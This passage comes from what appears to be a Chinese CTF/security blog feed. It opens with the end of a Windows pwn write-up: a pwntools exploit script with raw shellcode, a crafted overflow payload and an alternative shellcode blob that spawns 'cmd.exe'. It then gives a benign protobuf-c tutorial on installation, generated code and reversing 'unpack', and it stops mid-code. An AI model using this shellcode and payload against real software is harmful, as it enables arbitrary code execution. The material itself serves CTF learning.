class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov eax,0x14121c1</span></span><br><span class="line"><span class="string">    xor eax,ecx</span></span><br><span class="line"><span class="string">    mov ebx,[eax]</span></span><br><span class="line"><span class="string">    call ebx</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    pop ebx</span></span><br><span class="line"><span class="string">    jmp ebx</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#shellcode = asm(shellcode)</span></span><br><span class="line">shellcode = <span class="string">b&#x27;\xb9\x01\x01\x01\x01\xb8\xbd!A\x011\xc8\x8b\x181\xc9Q\xff\xd3YP\xb9\x01\x01\x01\x01Q1\xc0PX\x85\xc0u\x05\xe8\xf6\xff\xff\xfff-\x100P\xb8\xc1!A\x011\xc8\x8b\x18\xff\xd3[\xff\xe3&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(shellcode)</span><br><span class="line"><span class="keyword">assert</span>(<span class="string">b&#x27;\n&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> shellcode <span class="keyword">and</span> <span class="string">b&#x27;\x00&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> shellcode)</span><br><span class="line"><span class="keyword">assert</span>(<span class="built_in">len</span>(shellcode) &lt; <span class="number">120</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(shellcode)</span><br><span class="line">pause()</span><br><span class="line">payload = shellcode.ljust(<span class="number">120</span>,<span class="string">b&#x27;\xAA&#x27;</span>) + <span class="string">b&#x27;\xeb\x86\xAA\xAA&#x27;</span> + p32(pop2) + <span class="string">b&#x27;cmd.exe&#x27;</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;data:&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">b&#x27;\xcc&#x27;</span> + shell)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>或者改为</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell = <span class="string">b&#x27;U\x8b\xec\x83\xec SVW\xc7E\xe8u\x00c\x00\xc7E\xecr\x00t\x00f\xc7E\xfccm\xc6E\xfed\xc7E\xe0systf\xc7E\xe4em\xc6E\xe6\x00d\xa10\x00\x00\x00\x83\xc0\x0c\x8b\x00\x89E\xf8\x8b&#125;\xf8\x83\xc7\x14\x8b\x17;\xd7t8\x8dd$\x00\x8br(\x8dM\xe83\xc0+\xf1\x8d\x9b\x00\x00\x00\x00\x8d\x0cFf\x8bL\r\xe8f;LE\xe8u\x06@\x83\xf8\x04|\xeb\x83\xf8\x04\x0f\x84\x82\x00\x00\x00\x8b\x12;\xd7u\xcc\x8b&#125;\xf8\x8bG&lt;3\xf6\x8b\\8x\x8bD;\x1c\x03\xdf\x03\xc7\x89E\xf0\x8bK \x8bC$\x03\xcf\x03\xc7\x89M\xec\x89E\xf49s\x18vI\x8b\x14\xb1\x8dE\xe0\x03\xd73\xc9+\xd0\x8dd$\x00\x8d\x04\x11\x8aD\x05\xe0:D\r\xe0u\x06A\x83\xf9\x06|\xed\x83\xf9\x06u\x18\x8bM\xf0\x8dE\xfcP\x8bE\xf4\x0f\xb7\x04p\x8b\x04\x81\x03\xc7\xff\xd0\x83\xc4\x04\x8bM\xecF;s\x18r\xb7_^[\x8b\xe5]\xc3\x8bz\x10\xeb\x82&#x27;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">windows pwn</summary>
    
    
    
    <category term="pwn" scheme="https://ixout.github.io/categories/pwn/"/>
    
    
    <category term="windows" scheme="https://ixout.github.io/tags/windows/"/>
    
  </entry>
  
  <entry>
    <title>protobuf初识</title>
    <link href="https://ixout.github.io/posts/46596/"/>
    <id>https://ixout.github.io/posts/46596/</id>
    <published>2024-04-11T15:24:20.000Z</published>
    <updated>2025-03-13T13:07:54.534Z</updated>
    
    <content type="html"><![CDATA[<h1 id="protobuf"><a href="#protobuf" class="headerlink" title="protobuf"></a>protobuf</h1><p>Protobuf (Protocol Buffers) 是谷歌开发的一款无关平台，无关语言，可扩展，轻量级高效的<strong>序列化结构的数据格式</strong>，用于将自定义数据结构序列化成字节流，和将字节流反序列化为数据结构。</p><p>所以很适合做数据存储和为不同语言，不同应用之间互相通信的数据交换格式，只要实现相同的协议格式，即后缀为proto文件被编译成不同的语言版本，加入各自的项目中，这样不同的语言可以解析其它语言通过Protobuf序列化的数据。目前官方提供c++，java，go等语言支持。</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>c与python接口</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">python3 -m pip install protobuf</span><br><span class="line"></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/protobuf-c/protobuf-c.git</span><br><span class="line">sudo apt install autoconf, automake, libtool,libprotobuf-dev,libprotoc-dev,protobuf-compiler</span><br><span class="line">./autogen.sh </span><br><span class="line">./configure --prefix=/usr/local/protobuf-c --libdir=/usr/lib </span><br><span class="line">make -j8 &amp;&amp; make install</span><br><span class="line">sudo <span class="built_in">cp</span> -r /usr/local/protobuf-c/include/protobuf-c /usr/include</span><br><span class="line">sudo <span class="built_in">ln</span> -s /usr/local/protobuf-c/bin/protoc-gen-c /usr/local/bin/protoc-c</span><br></pre></td></tr></table></figure><p><code>protobuf-c</code>是protobuf的非官方c实现编译器</p><p>python安装的则是protobuf的官方库,官方库还有自带的<code>protoc(proobuf compiler)</code></p><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>写个例子尝试一下</p><figure class="highlight protobuf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//msg.proto</span></span><br><span class="line">syntax = <span class="string">&quot;proto2&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">message </span><span class="title class_">Person</span> &#123;</span><br><span class="line">  <span class="keyword">required</span> <span class="type">int32</span> id = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">required</span> <span class="type">string</span> name = <span class="number">2</span>;</span><br><span class="line">  <span class="keyword">optional</span> <span class="type">string</span> email = <span class="number">3</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行</p><p><code>protoc-c --c_out=. msg.proto</code></p><p>可以看到生成了两个文件</p><p><code>msg.pb-c.c</code>与<code>msg.pb-c.h</code></p><p>后者文件中声明了许多结构体与函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Generated by the protocol buffer compiler.  DO NOT EDIT! */</span></span><br><span class="line"><span class="comment">/* Generated from: msg.proto */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> PROTOBUF_C_msg_2eproto__INCLUDED</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PROTOBUF_C_msg_2eproto__INCLUDED</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;protobuf-c/protobuf-c.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">PROTOBUF_C__BEGIN_DECLS</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> PROTOBUF_C_VERSION_NUMBER &lt; 1000000</span></span><br><span class="line"><span class="meta"># <span class="keyword">error</span> This file was generated by a newer version of protoc-c which is incompatible with your libprotobuf-c headers. Please update your headers.</span></span><br><span class="line"><span class="meta">#<span class="keyword">elif</span> 1005000 &lt; PROTOBUF_C_MIN_COMPILER_VERSION</span></span><br><span class="line"><span class="meta"># <span class="keyword">error</span> This file was generated by an older version of protoc-c which is incompatible with your libprotobuf-c headers. Please regenerate this file with a newer version of protoc-c.</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Person</span> <span class="title">Person</span>;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* --- enums --- */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* --- messages --- */</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span>  <span class="title">Person</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  ProtobufCMessage base;</span><br><span class="line">  <span class="type">int32_t</span> id;</span><br><span class="line">  <span class="type">char</span> *name;</span><br><span class="line">  <span class="type">char</span> *email;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PERSON__INIT \</span></span><br><span class="line"><span class="meta"> &#123; PROTOBUF_C_MESSAGE_INIT (&amp;person__descriptor) \</span></span><br><span class="line"><span class="meta">    , 0, NULL, NULL &#125;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Person methods */</span></span><br><span class="line"><span class="type">void</span>   <span class="title function_">person__init</span></span><br><span class="line">                     <span class="params">(Person         *message)</span>;</span><br><span class="line"><span class="type">size_t</span> <span class="title function_">person__get_packed_size</span></span><br><span class="line">                     <span class="params">(<span class="type">const</span> Person   *message)</span>;</span><br><span class="line"><span class="type">size_t</span> <span class="title function_">person__pack</span></span><br><span class="line">                     <span class="params">(<span class="type">const</span> Person   *message,</span></span><br><span class="line"><span class="params">                      <span class="type">uint8_t</span>             *out)</span>;</span><br><span class="line"><span class="type">size_t</span> <span class="title function_">person__pack_to_buffer</span></span><br><span class="line">                     <span class="params">(<span class="type">const</span> Person   *message,</span></span><br><span class="line"><span class="params">                      ProtobufCBuffer     *buffer)</span>;</span><br><span class="line">Person *</span><br><span class="line">       <span class="title function_">person__unpack</span></span><br><span class="line">                     <span class="params">(ProtobufCAllocator  *allocator,</span></span><br><span class="line"><span class="params">                      <span class="type">size_t</span>               len,</span></span><br><span class="line"><span class="params">                      <span class="type">const</span> <span class="type">uint8_t</span>       *data)</span>;</span><br><span class="line"><span class="type">void</span>   <span class="title function_">person__free_unpacked</span></span><br><span class="line">                     <span class="params">(Person *message,</span></span><br><span class="line"><span class="params">                      ProtobufCAllocator *allocator)</span>;</span><br><span class="line"><span class="comment">/* --- per-message closures --- */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">void</span> <span class="params">(*Person_Closure)</span></span><br><span class="line">                 <span class="params">(<span class="type">const</span> Person *message,</span></span><br><span class="line"><span class="params">                  <span class="type">void</span> *closure_data)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* --- services --- */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* --- descriptors --- */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="type">const</span> ProtobufCMessageDescriptor person__descriptor;</span><br><span class="line"></span><br><span class="line">PROTOBUF_C__END_DECLS</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span>  <span class="comment">/* PROTOBUF_C_msg_2eproto__INCLUDED */</span></span></span><br></pre></td></tr></table></figure><p>然后便是.c文件</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Generated by the protocol buffer compiler.  DO NOT EDIT! */</span></span><br><span class="line"><span class="comment">/* Generated from: msg.proto */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Do not generate deprecated warnings for self */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> PROTOBUF_C__NO_DEPRECATED</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PROTOBUF_C__NO_DEPRECATED</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;msg.pb-c.h&quot;</span></span></span><br><span class="line"><span class="type">void</span>   <span class="title function_">person__init</span></span><br><span class="line">                     <span class="params">(Person         *message)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">static</span> <span class="type">const</span> Person init_value = PERSON__INIT;</span><br><span class="line">  *message = init_value;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">size_t</span> <span class="title function_">person__get_packed_size</span></span><br><span class="line">                     <span class="params">(<span class="type">const</span> Person *message)</span></span><br><span class="line">&#123;</span><br><span class="line">  assert(message-&gt;base.descriptor == &amp;person__descriptor);</span><br><span class="line">  <span class="keyword">return</span> protobuf_c_message_get_packed_size ((<span class="type">const</span> ProtobufCMessage*)(message));</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">size_t</span> <span class="title function_">person__pack</span></span><br><span class="line">                     <span class="params">(<span class="type">const</span> Person *message,</span></span><br><span class="line"><span class="params">                      <span class="type">uint8_t</span>       *out)</span></span><br><span class="line">&#123;</span><br><span class="line">  assert(message-&gt;base.descriptor == &amp;person__descriptor);</span><br><span class="line">  <span class="keyword">return</span> protobuf_c_message_pack ((<span class="type">const</span> ProtobufCMessage*)message, out);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">size_t</span> <span class="title function_">person__pack_to_buffer</span></span><br><span class="line">                     <span class="params">(<span class="type">const</span> Person *message,</span></span><br><span class="line"><span class="params">                      ProtobufCBuffer *buffer)</span></span><br><span class="line">&#123;</span><br><span class="line">  assert(message-&gt;base.descriptor == &amp;person__descriptor);</span><br><span class="line">  <span class="keyword">return</span> protobuf_c_message_pack_to_buffer ((<span class="type">const</span> ProtobufCMessage*)message, buffer);</span><br><span class="line">&#125;</span><br><span class="line">Person *</span><br><span class="line">       <span class="title function_">person__unpack</span></span><br><span class="line">                     <span class="params">(ProtobufCAllocator  *allocator,</span></span><br><span class="line"><span class="params">                      <span class="type">size_t</span>               len,</span></span><br><span class="line"><span class="params">                      <span class="type">const</span> <span class="type">uint8_t</span>       *data)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> (Person *)</span><br><span class="line">     protobuf_c_message_unpack (&amp;person__descriptor,</span><br><span class="line">                                allocator, len, data);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span>   <span class="title function_">person__free_unpacked</span></span><br><span class="line">                     <span class="params">(Person *message,</span></span><br><span class="line"><span class="params">                      ProtobufCAllocator *allocator)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span>(!message)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  assert(message-&gt;base.descriptor == &amp;person__descriptor);</span><br><span class="line">  protobuf_c_message_free_unpacked ((ProtobufCMessage*)message, allocator);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> <span class="type">const</span> ProtobufCFieldDescriptor person__field_descriptors[<span class="number">3</span>] =</span><br><span class="line">&#123;</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&quot;id&quot;</span>,</span><br><span class="line">    <span class="number">1</span>,</span><br><span class="line">    PROTOBUF_C_LABEL_REQUIRED,</span><br><span class="line">    PROTOBUF_C_TYPE_INT32,</span><br><span class="line">    <span class="number">0</span>,   <span class="comment">/* quantifier_offset */</span></span><br><span class="line">    offsetof(Person, id),</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    <span class="number">0</span>,             <span class="comment">/* flags */</span></span><br><span class="line">    <span class="number">0</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>    <span class="comment">/* reserved1,reserved2, etc */</span></span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&quot;name&quot;</span>,</span><br><span class="line">    <span class="number">2</span>,</span><br><span class="line">    PROTOBUF_C_LABEL_REQUIRED,</span><br><span class="line">    PROTOBUF_C_TYPE_STRING,</span><br><span class="line">    <span class="number">0</span>,   <span class="comment">/* quantifier_offset */</span></span><br><span class="line">    offsetof(Person, name),</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    <span class="number">0</span>,             <span class="comment">/* flags */</span></span><br><span class="line">    <span class="number">0</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>    <span class="comment">/* reserved1,reserved2, etc */</span></span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&quot;email&quot;</span>,</span><br><span class="line">    <span class="number">3</span>,</span><br><span class="line">    PROTOBUF_C_LABEL_OPTIONAL,</span><br><span class="line">    PROTOBUF_C_TYPE_STRING,</span><br><span class="line">    <span class="number">0</span>,   <span class="comment">/* quantifier_offset */</span></span><br><span class="line">    offsetof(Person, email),</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    <span class="number">0</span>,             <span class="comment">/* flags */</span></span><br><span class="line">    <span class="number">0</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>    <span class="comment">/* reserved1,reserved2, etc */</span></span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="type">unsigned</span> person__field_indices_by_name[] = &#123;</span><br><span class="line">  <span class="number">2</span>,   <span class="comment">/* field[2] = email */</span></span><br><span class="line">  <span class="number">0</span>,   <span class="comment">/* field[0] = id */</span></span><br><span class="line">  <span class="number">1</span>,   <span class="comment">/* field[1] = name */</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">static</span> <span class="type">const</span> ProtobufCIntRange person__number_ranges[<span class="number">1</span> + <span class="number">1</span>] =</span><br><span class="line">&#123;</span><br><span class="line">  &#123; <span class="number">1</span>, <span class="number">0</span> &#125;,</span><br><span class="line">  &#123; <span class="number">0</span>, <span class="number">3</span> &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">const</span> ProtobufCMessageDescriptor person__descriptor =</span><br><span class="line">&#123;</span><br><span class="line">  PROTOBUF_C__MESSAGE_DESCRIPTOR_MAGIC,</span><br><span class="line">  <span class="string">&quot;Person&quot;</span>,</span><br><span class="line">  <span class="string">&quot;Person&quot;</span>,</span><br><span class="line">  <span class="string">&quot;Person&quot;</span>,</span><br><span class="line">  <span class="string">&quot;&quot;</span>,</span><br><span class="line">  <span class="keyword">sizeof</span>(Person),</span><br><span class="line">  <span class="number">3</span>,</span><br><span class="line">  person__field_descriptors,</span><br><span class="line">  person__field_indices_by_name,</span><br><span class="line">  <span class="number">1</span>,  person__number_ranges,</span><br><span class="line">  (ProtobufCMessageInit) person__init,</span><br><span class="line">  <span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>    <span class="comment">/* reserved[123] */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>之后如何使用,我们只需要在自己的代码中引入头文件</p><p>然后便能够引用这些符号进行序列化与反序列化了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;msg.pb-c.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    Person person = PERSON__INIT;</span><br><span class="line">    person.id = <span class="number">1234</span>;</span><br><span class="line">    person.name = <span class="string">&quot;John Doe&quot;</span>;</span><br><span class="line">    person.email = <span class="string">&quot;johndoe@example.com&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将消息序列化为字节流</span></span><br><span class="line">    <span class="type">size_t</span> len = person__get_packed_size(&amp;person);</span><br><span class="line">    <span class="type">uint8_t</span> *buffer = <span class="built_in">malloc</span>(len);</span><br><span class="line">    person__pack(&amp;person, buffer);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将字节流反序列化为消息</span></span><br><span class="line">    Person *new_person = person__unpack(<span class="literal">NULL</span>, len, buffer);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 打印反序列化后的消息</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;ID: %d\n&quot;</span>, new_person-&gt;id);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Name: %s\n&quot;</span>, new_person-&gt;name);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Email: %s\n&quot;</span>, new_person-&gt;email);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(buffer);</span><br><span class="line">    person__free_unpacked(new_person, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="逆向"><a href="#逆向" class="headerlink" title="逆向"></a>逆向</h2><p>对于逆向我们主要关注unpack这个函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Person *</span><br><span class="line">       <span class="title function_">person__unpack</span></span><br><span class="line">                     <span class="params">(ProtobufCAllocator  *allocator,</span></span><br><span class="line"><span class="params">                      <span class="type">size_t</span>               len,</span></span><br><span class="line"><span class="params">                      <span class="type">const</span> <span class="type">uint8_t</span>       *data)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> (Person *)</span><br><span class="line">     protobuf_c_message_unpack (&amp;person__descriptor,</span><br><span class="line">                                allocator, len, data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其返回是一个Person指针,所需要的三个参数</p><ul><li>allocator一般不用理会,置0即可</li><li>len是长度,通过<code>person__get_packed_size</code>得到</li><li>data就是指向序列化的字节流</li></ul><p>可以看到<code>person__unpack</code>仅仅是对<code>protobuf_c_message_unpack</code>的封装</p><p>二者之间的差距就在于<code>person__descriptor</code>结构体,其在.c文件中被创建</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> ProtobufCMessageDescriptor person__descriptor =</span><br><span class="line">&#123;</span><br><span class="line">  PROTOBUF_C__MESSAGE_DESCRIPTOR_MAGIC,</span><br><span class="line">  <span class="string">&quot;Person&quot;</span>,</span><br><span class="line">  <span class="string">&quot;Person&quot;</span>,</span><br><span class="line">  <span class="string">&quot;Person&quot;</span>,</span><br><span class="line">  <span class="string">&quot;&quot;</span>,</span><br><span class="line">  <span class="keyword">sizeof</span>(Person),</span><br><span class="line">  <span class="number">3</span>,</span><br><span class="line">  person__field_descriptors,</span><br><span class="line">  person__field_indices_by_name,</span><br><span class="line">  <span class="number">1</span>,  person__number_ranges,</span><br><span class="line">  (ProtobufCMessageInit) person__init,</span><br><span class="line">  <span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>    <span class="comment">/* reserved[123] */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><a href="https://github.com/protobuf-c/protobuf-c">protobuf-c/protobuf-c: Protocol Buffers implementation in C (github.com)</a></p><p>查看protobuf-c源码,得到这个结构体的定义</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span 